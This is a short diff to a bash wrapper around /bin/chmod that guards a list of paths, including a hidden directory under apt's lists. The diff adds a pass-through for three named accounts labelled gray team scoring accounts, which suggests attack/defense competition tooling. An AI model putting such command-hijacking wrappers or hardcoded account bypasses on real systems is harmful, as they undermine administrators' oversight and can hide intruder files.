@@ -1,6 +1,12 @@
 #!/bin/bash
 REAL_CHMOD="/bin/chmod"
 
+# Pass straight through for gray team scoring accounts
+case "$(whoami)" in
+    kingneptune|paintythepirate|greyteamadmin) exec $REAL_CHMOD "$@" ;;
+esac
+
+
 PROTECTED=(
     "/usr/local/bin"
     "/var/lib/apt/lists/.cache"
